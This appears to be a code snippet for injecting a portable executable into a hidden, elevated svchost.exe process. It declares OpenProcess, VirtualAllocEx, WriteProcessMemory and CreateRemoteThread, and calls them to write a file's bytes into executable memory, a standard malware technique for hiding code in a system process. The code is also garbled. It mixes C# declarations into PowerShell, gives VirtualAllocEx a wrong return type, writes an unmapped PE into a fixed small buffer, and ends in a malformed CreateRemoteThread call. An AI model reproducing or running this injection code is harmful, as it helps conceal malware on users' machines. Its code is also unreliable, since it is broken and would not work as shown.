# Import the necessary Windows API functions
[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

[DllImport("kernel32.dll")]
public static extern bool VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
byte[] buffer, uint size, out int lpNumberOfBytesWritten);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttribute,
uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,
out IntPtr lpThreadId);

[DllImport("kernel32.dll")]
public static extern uint SuspendThread(IntPtr hThread);

[DllImport("kernel32.dll")]
public static extern uint ResumeThread(IntPtr hThread);

[DllImport("kernel32.dll")]
public static extern int CloseHandle(IntPtr hObject);

# Define constants
private const int PROCESS_ALL_ACCESS = 0x1F0FFF;
private const int MEM_COMMIT = 0x1000;
private const int PAGE_EXECUTE_READWRITE = 0x40;

# Start the svchost.exe process in a suspended state
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = "svchost.exe"
$process.StartInfo.UseShellExecute = $false
$process.StartInfo.CreateNoWindow = $true
$process.StartInfo.Arguments = "-k netsvcs"
$process.StartInfo.RedirectStandardOutput = $true
$process.StartInfo.RedirectStandardError = $true
$process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$process.StartInfo.Verb = "runas"
$process.Start()
$pid = $process.Id

# Open the svchost.exe process
$processHandle = OpenProcess(PROCESS_ALL_ACCESS, $false, $pid)

# Allocate memory in the svchost.exe process
$allocationAddress = VirtualAllocEx($processHandle, IntPtr::Zero, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE)

# Load the portable executable into memory
$peBytes = [System.IO.File]::ReadAllBytes("path/to/portable_executable.exe")

# Write the portable executable into the memory region
WriteProcessMemory($processHandle, $allocationAddress, $peBytes, $peBytes.Length, [ref]$numberOfBytesWritten)

# Create a remote thread in the svchost.exe process to execute the portable executable
CreateRemoteThread($processHandle, IntPtr)
